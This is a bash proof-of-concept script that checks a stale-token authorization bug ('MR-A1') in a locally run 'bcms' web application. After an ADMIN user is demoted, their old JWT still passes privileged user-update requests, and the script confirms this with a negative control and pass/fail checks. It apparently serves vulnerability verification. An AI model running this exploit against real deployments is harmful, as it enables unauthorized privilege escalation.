#!/usr/bin/env bash
set -u
B=http://localhost:8085
ST="$1"
PW='AdminPass123!'

acc() { python3 -c "import sys,json;print(json.load(sys.stdin).get('accessToken',''))" 2>/dev/null; }
login() { curl -s -X POST "$B/api/v4/auth/login" -H 'Content-Type: application/json' -d "{\"email\":\"$1\",\"password\":\"$2\"}" | acc; }
rls() { echo "$1" | cut -d. -f2 | python3 -c "import sys,base64,json;s=sys.stdin.read().strip();s+='='*(-len(s)%4);d=json.loads(base64.urlsafe_b64decode(s));print('rls=%s uid=%s'%(d.get('rls'),d.get('userId')))" 2>/dev/null || echo "rls=?(decode)"; }
create() { curl -s -o /tmp/bc -w '%{http_code}' -X POST "$B/api/v4/user/create" -H "Authorization: Bearer $1" -H 'Content-Type: application/json' -d "{\"email\":\"$2\",\"password\":\"$PW\",\"firstName\":\"$3\",\"lastName\":\"T\",\"role\":\"$4\"}"; }
upd() { curl -s -o /tmp/bc -w '%{http_code}' -X PUT "$B/api/v4/user/update" -H "Authorization: Bearer $1" -H 'Content-Type: application/json' -d "$2"; }
body() { head -c 90 /tmp/bc | tr '\n' ' '; }
idof() { curl -s -G "$B/api/v4/user/all" -H "Authorization: Bearer $1" | python3 -c "import sys,json;d=json.load(sys.stdin);u=d.get('items',d) if isinstance(d,dict) else d;print([x['_id'] for x in u if x.get('email')=='$2'][0])" 2>/dev/null; }

echo "== signup-admin (server token) =="
curl -s -X POST "$B/api/v4/auth/signup-admin" -H 'Content-Type: application/json' -d "{\"serverToken\":\"$ST\",\"email\":\"mainadmin@test.local\",\"password\":\"$PW\",\"firstName\":\"Main\",\"lastName\":\"Admin\"}" -w ' [http %{http_code}]\n' | head -c 200
TM=$(login mainadmin@test.local "$PW"); echo "  mainadmin: $(rls "$TM")"
echo "== mainadmin creates victim(ADMIN), plain(USER), target(USER) =="
echo "  victim=$(create "$TM" victim@test.local Victim ADMIN) $(body)"
echo "  plain =$(create "$TM" plain@test.local Plain USER) $(body)"
echo "  target=$(create "$TM" target@test.local Target USER) $(body)"
VID=$(idof "$TM" victim@test.local); TID=$(idof "$TM" target@test.local)
echo "  victimId=$VID targetId=$TID"

echo "== NEG CONTROL: plain(USER) PUT update target -> expect 403 =="
TP=$(login plain@test.local "$PW"); echo "  plain: $(rls "$TP")"
C_NEG=$(upd "$TP" "{\"_id\":\"$TID\",\"role\":\"USER\"}"); echo "  neg=$C_NEG $(body)"

echo "== FAST TRIPLE within 60s token (victim login -> source -> transition -> follow-up) =="
TV=$(login victim@test.local "$PW"); echo "  victim_old: $(rls "$TV")"
C_BEFORE=$(upd "$TV" "{\"_id\":\"$TID\",\"role\":\"USER\"}"); echo "  before(source)=$C_BEFORE $(body)"
C_TRANS=$(upd "$TM" "{\"_id\":\"$VID\",\"role\":\"USER\"}"); echo "  transition(demote victim)=$C_TRANS $(body)"
C_AFTER=$(upd "$TV" "{\"_id\":\"$TID\",\"role\":\"USER\"}"); echo "  after(bug, same token)=$C_AFTER $(body)"
TVN=$(login victim@test.local "$PW"); echo "  victim_new: $(rls "$TVN")"
C_NEW=$(upd "$TVN" "{\"_id\":\"$TID\",\"role\":\"USER\"}"); echo "  newtok=$C_NEW $(body)"

echo "== VERDICT =="
ok=1
case "$C_BEFORE" in 2*) ;; *) echo "  X source before not 2xx ($C_BEFORE)"; ok=0;; esac
case "$C_TRANS" in 2*) ;; *) echo "  X transition not 2xx ($C_TRANS)"; ok=0;; esac
case "$C_AFTER" in 2*) ;; *) echo "  X old-token after not 2xx ($C_AFTER)"; ok=0;; esac
[ "$C_NEW" = 403 ] || { echo "  X new-token != 403 ($C_NEW)"; ok=0; }
[ "$C_NEG" = 403 ] || { echo "  X neg != 403 ($C_NEG)"; ok=0; }
if [ "$ok" = 1 ]; then
  echo "  PASS: MR-A1 confirmed on running bcms $(git -C infra/bcms-target/app rev-parse --short HEAD 2>/dev/null)"
  echo "  old-token(rls ADMIN) after demotion=$C_AFTER vs new-token(rls USER)=$C_NEW ; neg=$C_NEG"
  exit 0
else echo "  FAIL"; exit 1; fi
